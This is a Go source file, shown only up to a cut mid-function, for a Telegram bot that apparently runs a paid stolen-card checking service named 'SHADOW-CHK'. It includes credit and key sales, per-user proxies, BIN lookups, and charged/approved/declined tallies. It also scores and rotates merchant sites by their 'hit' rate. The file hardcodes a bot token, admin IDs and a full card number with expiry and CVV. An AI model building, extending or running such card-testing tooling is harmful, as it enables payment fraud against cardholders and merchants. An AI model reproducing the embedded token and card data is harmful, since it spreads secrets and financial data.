package main

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"html"
	"io"
	"math/rand"
	"mime/multipart"
	"net/http"
	"net/textproto"
	"net/url"
	"os"
	"os/signal"
	"path/filepath"
	"sort"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"

	tele "gopkg.in/telebot.v4"
)


const botToken = "8708570332:AAEP1_RWcbq5uJzJtadqkS_5QCPjr16CSnc"
const logsGroupID = -1002798580895
var usersFile = "users.json"
var configFile = "botconfig.json"
var sitesFile = "customsites.json"
var keysFile = "customkeys.json"
var blacklistFile = "blacklistedsites.json"
var siteScoresFile = "sitescores.json"

func resolveDataDir() string {
	candidates := []string{"/data", "./data"}
	for _, c := range candidates {
		if fi, err := os.Stat(c); err == nil && fi.IsDir() {
			return c
		}
	}
	return "."
}

func init() {
	dataDir := resolveDataDir()
	if dataDir != "." {
		usersFile = filepath.Join(dataDir, "users.json")
		configFile = filepath.Join(dataDir, "botconfig.json")
		sitesFile = filepath.Join(dataDir, "customsites.json")
		keysFile = filepath.Join(dataDir, "customkeys.json")
		blacklistFile = filepath.Join(dataDir, "blacklistedsites.json")
		siteScoresFile = filepath.Join(dataDir, "sitescores.json")
		fmt.Printf("[DATA] using data directory: %s\n", dataDir)
	}
}

var adminIDs = map[int64]bool{
	5733576801: true,
	6028572049: true,
}

var cfg *BotConfig
var km *KeyManager
var fjRetryBtn tele.Btn
var ledger *Ledger
var qualityCheck = false

const (
	creditCostCharged  = 2.0
	creditCostApproved = 1.0
	minCreditsForCheck = 2.0
)

var dailyFreeLimit int64 = 1000

var verifyCardNumber = "4147207228677008|11|28|183"

func allAdminIDs() []int64 {
	ids := make([]int64, 0, len(adminIDs))
	for id := range adminIDs {
		ids = append(ids, id)
	}
	if cfg != nil {
		cfg.mu.RLock()
		ids = append(ids, cfg.DynamicAdmins...)
		cfg.mu.RUnlock()
	}
	return ids
}

func isAdmin(uid int64) bool {
	if adminIDs[uid] {
		return true
	}
	if cfg != nil {
		cfg.mu.RLock()
		defer cfg.mu.RUnlock()
		for _, a := range cfg.DynamicAdmins {
			if a == uid {
				return true
			}
		}
	}
	return false
}


type BotConfig struct {
	mu               sync.RWMutex
	BannedUsers      map[int64]bool      `json:"banned_users"`
	AllowedUsers     map[int64]bool     `json:"allowed_users"`
	PvtOnly          bool                `json:"pvt_only"`
	BlockedIDs       []int64             `json:"blocked_ids"`
	AllowOnlyIDs     []int64             `json:"allow_only_ids"`
	RestrictAll      bool                `json:"restrict_all"`
	Groups           []int64             `json:"groups"`
	GroupsOnly       bool                `json:"groups_only"`
	DynamicAdmins    []int64             `json:"dynamic_admins"`
	Perms            map[string][]string `json:"perms"`
	FreeMode         bool                `json:"free_mode"`
	DailyLimit       int64               `json:"daily_limit"`
	ForceJoin        []ForceJoinTarget   `json:"force_join"`
	ForceJoinEnabled bool                `json:"force_join_enabled"`
	DefaultCredits   float64             `json:"default_credits"`
}

type ForceJoinTarget struct {
	ChatID    int64  `json:"chat_id"`
	InviteURL string `json:"invite_url"`
	Title     string `json:"title"`
}

func NewBotConfig() *BotConfig {
	return &BotConfig{
		BannedUsers:  make(map[int64]bool),
		AllowedUsers: make(map[int64]bool),
		Perms:        make(map[string][]string),
		DailyLimit:   1000,
	}
}

func (bc *BotConfig) Save() {
	bc.mu.RLock()
	data, _ := json.MarshalIndent(bc, "", "  ")
	bc.mu.RUnlock()
	tmp := configFile + ".tmp"
	if err := os.WriteFile(tmp, data, 0644); err == nil {
		os.Rename(tmp, configFile)
	}
}

func (bc *BotConfig) Load() {
	data, err := os.ReadFile(configFile)
	if err != nil {
		return
	}
	bc.mu.Lock()
	defer bc.mu.Unlock()
	json.Unmarshal(data, bc)
	if bc.BannedUsers == nil {
		bc.BannedUsers = make(map[int64]bool)
	}
	if bc.AllowedUsers == nil {
		bc.AllowedUsers = make(map[int64]bool)
	}
	if bc.Perms == nil {
		bc.Perms = make(map[string][]string)
	}
	if bc.DailyLimit <= 0 {
		bc.DailyLimit = 1000
	}
}

func (bc *BotConfig) IsBanned(uid int64) bool {
	bc.mu.RLock()
	defer bc.mu.RUnlock()
	return bc.BannedUsers[uid]
}

func (bc *BotConfig) IsAllowed(uid int64, isPrivate bool) bool {
	if isAdmin(uid) {
		return true
	}
	bc.mu.RLock()
	defer bc.mu.RUnlock()
	for _, bid := range bc.BlockedIDs {
		if bid == uid {
			return false
		}
	}
	if bc.RestrictAll {
		found := false
		for _, aid := range bc.AllowOnlyIDs {
			if aid == uid {
				found = true
				break
			}
		}
		if !found {
			return false
		}
	}
	if bc.GroupsOnly && isPrivate && !bc.AllowedUsers[uid] {
		return false
	}
	if bc.PvtOnly && !bc.AllowedUsers[uid] {
		return false
	}
	return true
}

func hasPerm(uid int64, cmd string) bool {
	if isAdmin(uid) {
		return true
	}
	if cfg == nil {
		return false
	}
	cfg.mu.RLock()
	defer cfg.mu.RUnlock()
	key := strconv.FormatInt(uid, 10)
	for _, c := range cfg.Perms[key] {
		if c == cmd {
			return true
		}
	}
	return false
}


type BINInfo struct {
	Brand       string `json:"brand"`
	Type        string `json:"type"`
	Level       string `json:"level"`
	Bank        string `json:"bank"`
	Country     string `json:"country"`
	CountryCode string `json:"country_code"`
	CountryFlag string `json:"country_flag"`
}

var binCache sync.Map // string (first6) -> *BINInfo

func lookupBIN(bin string, lineNum int) *BINInfo {
	if len(bin) < 6 {
		return &BINInfo{Brand: "Unknown", Type: "Unknown", Level: "Unknown", Bank: "Unknown", Country: "Unknown", CountryCode: "XX", CountryFlag: ""}
	}
	first6 := bin[:6]
	ua := fmt.Sprintf("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%d.0.0.0 Safari/537.36", 100+lineNum)
	req, err := http.NewRequest("GET", "https://bins.antipublic.dev/bins/"+first6, nil)
	if err != nil {
		return &BINInfo{Brand: "Unknown", Type: "Unknown", Level: "Unknown", Bank: "Unknown", Country: "Unknown", CountryCode: "XX", CountryFlag: ""}
	}
	req.Header.Set("User-Agent", ua)
	cl := &http.Client{Timeout: 5 * time.Second}
	resp, err := cl.Do(req)
	if err != nil {
		return &BINInfo{Brand: "Unknown", Type: "Unknown", Level: "Unknown", Bank: "Unknown", Country: "Unknown", CountryCode: "XX", CountryFlag: ""}
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)
	var info BINInfo
	if json.Unmarshal(body, &info) != nil {
		info = BINInfo{Brand: "Unknown", Type: "Unknown", Level: "Unknown", Bank: "Unknown", Country: "Unknown", CountryCode: "XX", CountryFlag: ""}
	}
	if info.CountryFlag == "" {
		info.CountryFlag = countryFlag(info.CountryCode)
	}
	return &info
}

func countryFlag(code string) string {
	if len(code) != 2 {
		return ""
	}
	code = strings.ToUpper(code)
	return string(rune(0x1F1E6+rune(code[0])-'A')) + string(rune(0x1F1E6+rune(code[1])-'A'))
}


func em(id, fallback string) string {
	return `<tg-emoji emoji-id="` + id + `">` + fallback + `</tg-emoji>`
}

const (
	emojiCharged   = "5352703228586773121"
	emojiCard      = "5472250091332993630"
	emojiGateway   = "4958689671950369798"
	emojiDoc       = "5444856076954520455"
	emojiPrice     = "5409048419211682843"
	emojiBrand     = "5402186569006210455"
	emojiBank      = "5332455502917949981"
	emojiGlobe     = "5224450179368767019"
	emojiUser      = "6100546649312987047"
	emojiLightning = "5354879329601876937"
	emojiCheck     = "6296367896398399651"
	emojiBlue      = "5780403162913444711"
	emojiSearch    = "5395444784611480792"
	emojiCross     = "5210952531676504517"
	emojiWarn      = "5447644880824181073"
	emojiClock     = "5780616017197667562"

	emojiBot       = "5352994912700762383"
	emojiWave      = "5947013302331640354"
	emojiList      = "5222444124698853913"
	emojiCmdSh     = "5445353829304387411"
	emojiCmdTxt    = "5305265301917549162"
	emojiCmdSetpr  = "5447410659077661506"
	emojiCmdRmpr   = "5445267414562389170"
	emojiCmdStats  = "5231200819986047254"
	emojiCmdActive = "6001526766714227911"
	emojiPwr       = "5456140674028019486"
	emojiPwrStart  = "5429265105151879015"

	emojiRowCheck = "5197269100878907942"
	emojiRowAppr  = "5352658337588612223"
	emojiRowDecl  = "5355169587786713125"
	emojiRowCard  = "5474641619317698626"
	emojiMoney    = "6235459831302460476"
	emojiHitRate  = "5244837092042750681"
	emojiPctAppr  = "6084779072750097974"
	emojiPwrStats = "5195033767969839232"

	emojiLive = "5256134032852278918"
	emojiTime = "5413704112220949842"

	emojiStar     = "5386757680679377085"
	emojiCalendar = "6136500366008649837"

	emojiHitStar      = "5217822164362739968"
	emojiHitDetect    = "5877395722164247324"
	emojiHitChannel   = "5352585602317426381"
	emojiHitShield    = "5206607081334906820"
	emojiHitGear      = "5296369303661067030"
	emojiHitLock      = "5039614900280754969"
	emojiHitKey       = "5042328396193864923"
	emojiHitWarn      = "5447644880824181073"
	emojiHitChart     = "5039778134807806727"
	emojiHitList      = "5039671744172917707"
	emojiHitTrash     = "5042334757040423886"
	emojiHitCoin      = "5409048419211682843"
	emojiHitBan       = "5041975203853239332"
	emojiHitSync      = "5042290883949495533"
	emojiHitGlobe     = "5999317873623831250"
	emojiHitMegaphone = "5039891861246838069"
	emojiHitNote      = "5039649904264217620"
	emojiHitMagnet    = "5039600026809009149"
	emojiHdrBot       = "5298970748172385213"
	emojiHdrClock     = "5039623284056917259"
	emojiHdrBars      = "4936468614967460670"
	emojiHdrCrown     = "5427168083074628963"
	emojiHdrFire      = "5040030395416969985"
)


type UserStats struct {
	TotalChecked    int64   `json:"total_checked"`
	TotalCharged    int64   `json:"total_charged"`
	TotalApproved   int64   `json:"total_approved"`
	TotalDeclined   int64   `json:"total_declined"`
	TotalChargedAmt float64 `json:"total_charged_amt"`
}

type UserData struct {
	Proxies      []string  `json:"proxies"`
	Stats        UserStats `json:"stats"`
	Credits      float64   `json:"credits"`
	Username     string    `json:"username,omitempty"`
	DailyCount   int64     `json:"daily_count"`
	DailyDate    string    `json:"daily_date"`
	UnlimitedUntil int64   `json:"unlimited_until"`
}

type UserManager struct {
	mu    sync.RWMutex
	users map[int64]*UserData
}

func NewUserManager() *UserManager {
	return &UserManager{users: make(map[int64]*UserData)}
}

func (um *UserManager) Get(uid int64) *UserData {
	um.mu.RLock()
	ud := um.users[uid]
	um.mu.RUnlock()
	if ud != nil {
		return ud
	}
	um.mu.Lock()
	defer um.mu.Unlock()
	if um.users[uid] == nil {
		um.users[uid] = &UserData{}
		if cfg != nil {
			cfg.mu.RLock()
			um.users[uid].Credits = cfg.DefaultCredits
			cfg.mu.RUnlock()
		}
	}
	return um.users[uid]
}

func (um *UserManager) Save() {
	um.mu.RLock()
	data, _ := json.MarshalIndent(um.users, "", "  ")
	um.mu.RUnlock()
	tmpFile := usersFile + ".tmp"
	if err := os.WriteFile(tmpFile, data, 0644); err == nil {
		os.Rename(tmpFile, usersFile)
	}
}

func (um *UserManager) Load() {
	data, err := os.ReadFile(usersFile)
	if err != nil {
		return
	}
	um.mu.Lock()
	defer um.mu.Unlock()
	json.Unmarshal(data, &um.users)
	if um.users == nil {
		um.users = make(map[int64]*UserData)
	}
}

func (um *UserManager) AllIDs() []int64 {
	um.mu.RLock()
	defer um.mu.RUnlock()
	ids := make([]int64, 0, len(um.users))
	for id := range um.users {
		ids = append(ids, id)
	}
	return ids
}

func (um *UserManager) SetUsername(uid int64, username string) {
	um.mu.Lock()
	defer um.mu.Unlock()
	ud, ok := um.users[uid]
	if !ok {
		ud = &UserData{}
		um.users[uid] = ud
	}
	if username != "" {
		ud.Username = username
	}
}

func (um *UserManager) GetCredits(uid int64) float64 {
	um.mu.RLock()
	defer um.mu.RUnlock()
	ud, ok := um.users[uid]
	if !ok {
		return 0
	}
	return ud.Credits
}

func (um *UserManager) HasCredits(uid int64) bool {
	um.mu.RLock()
	defer um.mu.RUnlock()
	ud, ok := um.users[uid]
	if !ok {
		return false
	}
	return ud.Credits >= minCreditsForCheck
}

func (um *UserManager) AddCredits(uid int64, amount float64) float64 {
	um.mu.Lock()
	defer um.mu.Unlock()
	ud, ok := um.users[uid]
	if !ok {
		ud = &UserData{}
		um.users[uid] = ud
	}
	ud.Credits += amount
	return ud.Credits
}

func (um *UserManager) DeductCredits(uid int64, amount float64) {
	um.mu.Lock()
	defer um.mu.Unlock()
	ud, ok := um.users[uid]
	if !ok {
		ud = &UserData{}
		um.users[uid] = ud
	}
	ud.Credits -= amount
	if ud.Credits < 0 {
		ud.Credits = 0
	}
}

func (um *UserManager) AddStats(uid int64, checked, charged, approved, declined int64, chargedAmt float64) {
	um.mu.Lock()
	defer um.mu.Unlock()
	ud, ok := um.users[uid]
	if !ok {
		ud = &UserData{}
		um.users[uid] = ud
	}
	ud.Stats.TotalChecked += checked
	ud.Stats.TotalCharged += charged
	ud.Stats.TotalApproved += approved
	ud.Stats.TotalDeclined += declined
	ud.Stats.TotalChargedAmt += chargedAmt
}

func (um *UserManager) GetExisting(uid int64) *UserData {
	um.mu.RLock()
	defer um.mu.RUnlock()
	return um.users[uid]
}

func (um *UserManager) GetProxies(uid int64) []string {
	um.mu.RLock()
	defer um.mu.RUnlock()
	ud, ok := um.users[uid]
	if !ok {
		return nil
	}
	return append([]string(nil), ud.Proxies...)
}

func (um *UserManager) AddProxy(uid int64, proxy string) {
	um.mu.Lock()
	defer um.mu.Unlock()
	ud, ok := um.users[uid]
	if !ok {
		ud = &UserData{}
		um.users[uid] = ud
	}
	ud.Proxies = append(ud.Proxies, proxy)
}

func (um *UserManager) SetProxies(uid int64, proxies []string) {
	um.mu.Lock()
	defer um.mu.Unlock()
	ud, ok := um.users[uid]
	if !ok {
		ud = &UserData{}
		um.users[uid] = ud
	}
	ud.Proxies = proxies
}

func currentDailyLimit() int64 {
	if cfg != nil {
		cfg.mu.RLock()
		limit := cfg.DailyLimit
		free := cfg.FreeMode
		cfg.mu.RUnlock()
		if free {
			return 1 << 62
		}
		if limit > 0 {
			return limit
		}
	}
	return dailyFreeLimit
}

func (um *UserManager) GetDailyCount(uid int64) int64 {
	um.mu.RLock()
	defer um.mu.RUnlock()
	ud, ok := um.users[uid]
	if !ok {
		return 0
	}
	today := time.Now().Format("2006-01-02")
	if ud.DailyDate != today {
		return 0
	}
	return ud.DailyCount
}

func (um *UserManager) IncDailyChecked(uid int64) (int64, bool) {
	um.mu.Lock()
	defer um.mu.Unlock()
	ud, ok := um.users[uid]
	if !ok {
		ud = &UserData{}
		um.users[uid] = ud
	}
	today := time.Now().Format("2006-01-02")
	if ud.DailyDate != today {
		ud.DailyDate = today
		ud.DailyCount = 0
	}
	ud.DailyCount++
	return ud.DailyCount, ud.DailyCount <= currentDailyLimit()
}

func (um *UserManager) SetUnlimited(uid int64, untilUnix int64) {
	um.mu.Lock()
	defer um.mu.Unlock()
	ud, ok := um.users[uid]
	if !ok {
		ud = &UserData{}
		um.users[uid] = ud
	}
	ud.UnlimitedUntil = untilUnix
}

func (um *UserManager) HasUnlimited(uid int64) bool {
	um.mu.RLock()
	defer um.mu.RUnlock()
	ud, ok := um.users[uid]
	if !ok {
		return false
	}
	return ud.UnlimitedUntil > time.Now().Unix()
}

func (um *UserManager) FindByUsername(username string) (int64, bool) {
	needle := strings.ToLower(strings.TrimPrefix(strings.TrimSpace(username), "@"))
	if needle == "" {
		return 0, false
	}
	um.mu.RLock()
	defer um.mu.RUnlock()
	for id, ud := range um.users {
		if strings.ToLower(ud.Username) == needle {
			return id, true
		}
	}
	return 0, false
}


type Key struct {
	Code        string `json:"code"`
	Type        string `json:"type"`
	Credits     int64  `json:"credits"`
	Duration    string `json:"duration"`
	CreatedAt   int64  `json:"created_at"`
	ActivatedAt int64  `json:"activated_at,omitempty"`
	ActivatedBy int64  `json:"activated_by,omitempty"`
	ExpiresAt   int64  `json:"expires_at,omitempty"`
	Active      bool   `json:"active"`
}

type KeyManager struct {
	mu      sync.RWMutex
	keys    map[string]*Key
	history []*Key
}

func NewKeyManager() *KeyManager {
	return &KeyManager{keys: make(map[string]*Key)}
}

func (k *KeyManager) Load() {
	data, err := os.ReadFile(keysFile)
	if err != nil {
		return
	}
	k.mu.Lock()
	defer k.mu.Unlock()
	var keys []*Key
	if json.Unmarshal(data, &keys) != nil {
		return
	}
	k.keys = make(map[string]*Key)
	k.history = nil
	for _, key := range keys {
		k.history = append(k.history, key)
		k.keys[key.Code] = key
	}
}

func (k *KeyManager) Save() {
	k.mu.RLock()
	data, _ := json.MarshalIndent(k.history, "", "  ")
	k.mu.RUnlock()
	tmp := keysFile + ".tmp"
	if os.WriteFile(tmp, data, 0644) == nil {
		os.Rename(tmp, keysFile)
	}
}

func (k *KeyManager) Generate(keyType string, credits int64, duration string) (*Key, error) {
	const charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, 6)
	for i := range b {
		b[i] = charset[rand.Intn(len(charset))]
	}
	code := "SHADOW-CHK-" + string(b)
	key := &Key{
		Code:     code,
		Type:     keyType,
		Credits:  credits,
		Duration: duration,
		CreatedAt: time.Now().Unix(),
		Active:   true,
	}
	k.mu.Lock()
	k.keys[code] = key
	k.history = append(k.history, key)
	k.mu.Unlock()
	k.Save()
	return key, nil
}

func (k *KeyManager) Redeem(code string, uid int64) (*Key, error) {
	k.mu.Lock()
	key, ok := k.keys[code]
	if !ok {
		k.mu.Unlock()
		return nil, fmt.Errorf("invalid key")
	}
	if !key.Active {
		k.mu.Unlock()
		return nil, fmt.Errorf("key is deactivated")
	}
	if key.ActivatedAt > 0 && key.Type == "credits" {
		k.mu.Unlock()
		return nil, fmt.Errorf("key already redeemed")
	}
	if key.Type == "unlimited" && key.ActivatedAt > 0 && key.ExpiresAt > time.Now().Unix() {
		k.mu.Unlock()
		return nil, fmt.Errorf("key already active")
	}
	now := time.Now()
	key.ActivatedAt = now.Unix()
	key.ActivatedBy = uid
	if durationHours, err := strconv.Atoi(key.Duration); err == nil && durationHours > 0 {
		key.ExpiresAt = now.Add(time.Duration(durationHours) * time.Hour).Unix()
	} else if key.Duration == "permanent" {
		key.ExpiresAt = 0
	}
	k.mu.Unlock()
	k.Save()
	return key, nil
}

func (k *KeyManager) Active() []*Key {
	k.mu.RLock()
	defer k.mu.RUnlock()
	var out []*Key
	for _, key := range k.keys {
		if key.Active && key.ActivatedAt == 0 {
			out = append(out, key)
		}
	}
	return out
}

func (k *KeyManager) AllHistory() []*Key {
	k.mu.RLock()
	defer k.mu.RUnlock()
	out := make([]*Key, len(k.history))
	copy(out, k.history)
	return out
}

func (k *KeyManager) Deactivate(code string) bool {
	k.mu.Lock()
	defer k.mu.Unlock()
	key, ok := k.keys[code]
	if !ok {
		return false
	}
	key.Active = false
	k.Save()
	return true
}

func (k *KeyManager) DeactivateAll() int {
	k.mu.Lock()
	defer k.mu.Unlock()
	count := 0
	for _, key := range k.keys {
		if key.Active {
			key.Active = false
			count++
		}
	}
	k.Save()
	return count
}

func (k *KeyManager) Delete(code string) bool {
	k.mu.Lock()
	defer k.mu.Unlock()
	key, ok := k.keys[code]
	if !ok {
		return false
	}
	delete(k.keys, code)
	for i, h := range k.history {
		if h == key {
			k.history = append(k.history[:i], k.history[i+1:]...)
			break
		}
	}
	k.Save()
	return true
}

func (k *KeyManager) DeleteAll() int {
	k.mu.Lock()
	defer k.mu.Unlock()
	count := len(k.keys)
	k.keys = make(map[string]*Key)
	k.history = nil
	k.Save()
	return count
}

type CheckSession struct {
	UserID          int64
	Username        string
	SessionID       string
	Cards           []string
	OriginalIndices []int
	Total        int
	Checked      atomic.Int64
	Charged      atomic.Int64
	Approved     atomic.Int64
	Declined     atomic.Int64
	Errors       atomic.Int64
	StartTime    time.Time
	Cancel       context.CancelFunc
	Cancelled    atomic.Bool
	Stopped      atomic.Bool
	Done         chan struct{}
	ShowDecl     bool   // true for /sh, false for /txt
	ShowApproved bool   // true to send approved cards in chat
	GatewayName  string // display name for progress/completed messages

	chargedAmtMu sync.Mutex
	chargedAmt   float64

	errorCardsMu sync.Mutex
	errorCards   []string

	outputMu sync.Mutex
	ledger   *Ledger
}

func (s *CheckSession) AddChargedAmt(v float64) {
	s.chargedAmtMu.Lock()
	s.chargedAmt += v
	s.chargedAmtMu.Unlock()
}

func (s *CheckSession) ChargedAmt() float64 {
	s.chargedAmtMu.Lock()
	defer s.chargedAmtMu.Unlock()
	return s.chargedAmt
}

func (s *CheckSession) addErrorCard(card, errMsg string) {
	s.errorCardsMu.Lock()
	s.errorCards = append(s.errorCards, card)
	s.errorCardsMu.Unlock()
}

func sendErrorCards(bot *tele.Bot, chat *tele.Chat, sess *CheckSession) {
	sess.errorCardsMu.Lock()
	if len(sess.errorCards) == 0 {
		sess.errorCardsMu.Unlock()
		return
	}
	cards := make([]string, len(sess.errorCards))
	copy(cards, sess.errorCards)
	sess.errorCardsMu.Unlock()

	text := strings.Join(cards, "\n")
	buf := bytes.NewBufferString(text)
	doc := &tele.Document{
		File:     tele.FromReader(buf),
		FileName: "error_cards.txt",
		Caption:  fmt.Sprintf("%d error card(s) returned for recheck", len(cards)),
	}
	bot.Send(chat, doc)
}

func generateSessionID() string {
	const hex = "0123456789ABCDEF"
	b := make([]byte, 17)
	for i := range b {
		if i == 8 {
			b[i] = '-'
		} else {
			b[i] = hex[rand.Intn(16)]
		}
	}
	return string(b)
}

var activeSessions sync.Map    // int64 (userID) -> *CheckSession (latest for that user)
var allActiveSessions sync.Map // string (sessionID) -> *CheckSession (every live session)

func registerSession(sess *CheckSession) {
	activeSessions.Store(sess.UserID, sess)
	allActiveSessions.Store(sess.SessionID, sess)
}

func unregisterSession(sess *CheckSession) {
	allActiveSessions.Delete(sess.SessionID)
	if val, ok := activeSessions.Load(sess.UserID); ok && val.(*CheckSession) == sess {
		activeSessions.Delete(sess.UserID)
	}
}

func stopAllUserSessions(uid int64) int {
	count := 0
	allActiveSessions.Range(func(_, val any) bool {
		s := val.(*CheckSession)
		if s.UserID == uid {
			s.Cancelled.Store(true)
			if s.Cancel != nil {
				s.Cancel()
			}
			unregisterSession(s)
			count++
		}
		return true
	})
	return count
}


type txtPendingData struct {
	Cards           []string
	OriginalIndices []int
	ChatID          int64
	Username        string
	GateName        string
	CheckFn         stripeCheckFn
}

var (
	txtPendingMu sync.Mutex
	txtPending   = map[int64]*txtPendingData{} // userID -> pending data
)


var (
	customSitesMu sync.RWMutex
	customSites   []string
)


func loadCustomSites() {
	data, err := os.ReadFile(sitesFile)
	if err != nil {
		return
	}
	customSitesMu.Lock()
	defer customSitesMu.Unlock()
	json.Unmarshal(data, &customSites)
}

func saveCustomSites() {
	customSitesMu.RLock()
	data, _ := json.MarshalIndent(customSites, "", "  ")
	customSitesMu.RUnlock()
	tmp := sitesFile + ".tmp"
	if err := os.WriteFile(tmp, data, 0644); err == nil {
		os.Rename(tmp, sitesFile)
	}
}

func getCustomSites() []string {
	customSitesMu.RLock()
	defer customSitesMu.RUnlock()
	if len(customSites) == 0 {
		return nil
	}
	cp := make([]string, len(customSites))
	copy(cp, customSites)
	return cp
}

var (
	blacklistMu sync.RWMutex
	blacklist   = map[string]bool{}
)

func normalizeSiteKey(s string) string {
	s = strings.TrimSpace(s)
	s = strings.TrimRight(s, "/")
	s = strings.TrimPrefix(s, "https://")
	s = strings.TrimPrefix(s, "http://")
	return strings.ToLower(s)
}

func loadBlacklist() {
	data, err := os.ReadFile(blacklistFile)
	if err != nil {
		return
	}
	var list []string
	if json.Unmarshal(data, &list) != nil {
		return
	}
	blacklistMu.Lock()
	blacklist = make(map[string]bool, len(list))
	for _, s := range list {
		k := normalizeSiteKey(s)
		if k != "" {
			blacklist[k] = true
		}
	}
	blacklistMu.Unlock()
	fmt.Printf("[BLACKLIST] loaded %d blacklisted sites\n", len(blacklist))
}

func saveBlacklist() {
	blacklistMu.RLock()
	list := make([]string, 0, len(blacklist))
	for k := range blacklist {
		list = append(list, k)
	}
	blacklistMu.RUnlock()
	sort.Strings(list)
	data, _ := json.MarshalIndent(list, "", "  ")
	tmp := blacklistFile + ".tmp"
	if err := os.WriteFile(tmp, data, 0644); err == nil {
		os.Rename(tmp, blacklistFile)
	}
}

func isBlacklisted(siteURL string) bool {
	blacklistMu.RLock()
	defer blacklistMu.RUnlock()
	return blacklist[normalizeSiteKey(siteURL)]
}

func addBlacklist(siteURL string) bool {
	k := normalizeSiteKey(siteURL)
	if k == "" {
		return false
	}
	blacklistMu.Lock()
	if blacklist[k] {
		blacklistMu.Unlock()
		return false
	}
	blacklist[k] = true
	blacklistMu.Unlock()
	saveBlacklist()
	fmt.Printf("[BLACKLIST] added %s\n", k)
	return true
}

type SiteScore struct {
	Hits       int   `json:"hits"`
	Attempts   int   `json:"attempts"`
	Errors     int   `json:"errors"`
	LastHitAt  int64 `json:"last_hit_at"`
	LastUsedAt int64 `json:"last_used_at"`
}

var (
	siteScoresMu sync.RWMutex
	siteScores   = map[string]*SiteScore{}
)

func loadSiteScores() {
	data, err := os.ReadFile(siteScoresFile)
	if err != nil {
		return
	}
	siteScoresMu.Lock()
	defer siteScoresMu.Unlock()
	if json.Unmarshal(data, &siteScores) != nil {
		siteScores = make(map[string]*SiteScore)
	}
	for k, v := range siteScores {
		if v == nil {
			delete(siteScores, k)
		}
	}
	fmt.Printf("[SCORES] loaded %d site scores\n", len(siteScores))
}

func saveSiteScores() {
	siteScoresMu.RLock()
	data, _ := json.MarshalIndent(siteScores, "", "  ")
	siteScoresMu.RUnlock()
	tmp := siteScoresFile + ".tmp"
	if err := os.WriteFile(tmp, data, 0644); err == nil {
		os.Rename(tmp, siteScoresFile)
	}
}

func recordSiteAttempt(siteURL string, hit bool) {
	k := normalizeSiteKey(siteURL)
	if k == "" {
		return
	}
	siteScoresMu.Lock()
	defer siteScoresMu.Unlock()
	s, ok := siteScores[k]
	if !ok {
		s = &SiteScore{}
		siteScores[k] = s
	}
	s.Attempts++
	s.LastUsedAt = time.Now().Unix()
	if hit {
		s.Hits++
		s.LastHitAt = s.LastUsedAt
	}
}

func recordSiteError(siteURL string) {
	k := normalizeSiteKey(siteURL)
	if k == "" {
		return
	}
	siteScoresMu.Lock()
	defer siteScoresMu.Unlock()
	s, ok := siteScores[k]
	if !ok {
		s = &SiteScore{}
		siteScores[k] = s
	}
	s.Errors++
}

func recordSiteHit(siteURL string) {
	k := normalizeSiteKey(siteURL)
	if k == "" {
		return
	}
	siteScoresMu.Lock()
	s, ok := siteScores[k]
	if !ok {
		s = &SiteScore{}
		siteScores[k] = s
	}
	s.Hits++
	now := time.Now().Unix()
	s.LastHitAt = now
	s.LastUsedAt = now
	siteScoresMu.Unlock()
	saveSiteScores()
}

func recordSiteMiss(siteURL string) {
	recordSiteAttempt(siteURL, false)
}

func getSiteScore(siteURL string) *SiteScore {
	k := normalizeSiteKey(siteURL)
	siteScoresMu.RLock()
	defer siteScoresMu.RUnlock()
	if s, ok := siteScores[k]; ok {
		cp := *s
		return &cp
	}
	return &SiteScore{}
}

type siteWeight struct {
	url    string
	weight float64
}

func computeSiteWeights(sites []string) []siteWeight {
	now := time.Now().Unix()
	const coldDuration = 600
	const minWeight = 0.05
	const recencyBoostWindow = 1800
	const recencyBoostMax = 3.0
	const errorPenaltyMax = 0.5

	siteScoresMu.RLock()
	defer siteScoresMu.RUnlock()

	weights := make([]siteWeight, len(sites))
	for i, s := range sites {
		k := normalizeSiteKey(s)
		score, ok := siteScores[k]
		if !ok || score == nil {
			weights[i] = siteWeight{url: s, weight: 1.0}
			continue
		}
		hits := float64(score.Hits)
		attempts := float64(score.Attempts)
		errors := float64(score.Errors)

		hitRate := (hits + 1.0) / (attempts + 2.0)
		bonus := 1.0 + hitRate*4.0

		if score.LastHitAt > 0 {
			hitElapsed := now - score.LastHitAt
			if hitElapsed < recencyBoostWindow {
				recencyFactor := 1.0 + (recencyBoostMax-1.0)*(float64(recencyBoostWindow-hitElapsed)/float64(recencyBoostWindow))
				bonus *= recencyFactor
			}
		}

		if attempts > 0 && errors > 0 {
			errorRate := errors / attempts
			penalty := 1.0 - errorRate*errorPenaltyMax
			if penalty < 0.1 {
				penalty = 0.1
			}
			bonus *= penalty
		}

		coldFactor := 1.0
		elapsed := now - score.LastUsedAt
		if score.LastUsedAt > 0 && elapsed < coldDuration {
			coldFactor = float64(elapsed) / float64(coldDuration)
			if coldFactor < minWeight {
				coldFactor = minWeight
			}
		}

		weights[i] = siteWeight{url: s, weight: bonus * coldFactor}
	}
	return weights
}

func pickWeightedSites(sites []string) []string {
	if len(sites) <= 1 {
		return sites
	}

	weights := computeSiteWeights(sites)

	total := 0.0
	for _, w := range weights {
		total += w.weight
	}
	if total <= 0 {
		return sites
	}

	ordered := make([]string, 0, len(sites))
	used := make([]bool, len(sites))
	for len(ordered) < len(sites) {
		r := rand.Float64() * total
		cum := 0.0
		for i, w := range weights {
			if used[i] {
				continue
			}
			cum += w.weight
			if r >= cum {
				continue
			}
			ordered = append(ordered, sites[i])
			used[i] = true
			total -= w.weight
			break
		}
	}

	fmt.Printf("[SCORES] weighted site selection done (top: %s)\n", normalizeSiteKey(ordered[0]))
	return ordered
}


var (
	sitePoolMu sync.RWMutex
	sitePool   []string
)

func refreshSitePool() {
	apiURL := strings.TrimSpace(workingSitesAPI)
	if apiURL == "" {
		sitePoolMu.Lock()
		if len(sitePool) == 0 {
			sitePool = []string{defaultShopURL}
		}
		sitePoolMu.Unlock()
		return
	}
	sites, err := fetchAffordableSites(apiURL, maxSiteAmount)
	if err != nil || len(sites) == 0 {
		sitePoolMu.Lock()
		if len(sitePool) == 0 {
			sitePool = []string{defaultShopURL}
		}
		sitePoolMu.Unlock()
		return
	}
	rand.Shuffle(len(sites), func(i, j int) {
		sites[i], sites[j] = sites[j], sites[i]
	})
	newPool := make([]string, 0, len(sites))
	skipped := 0
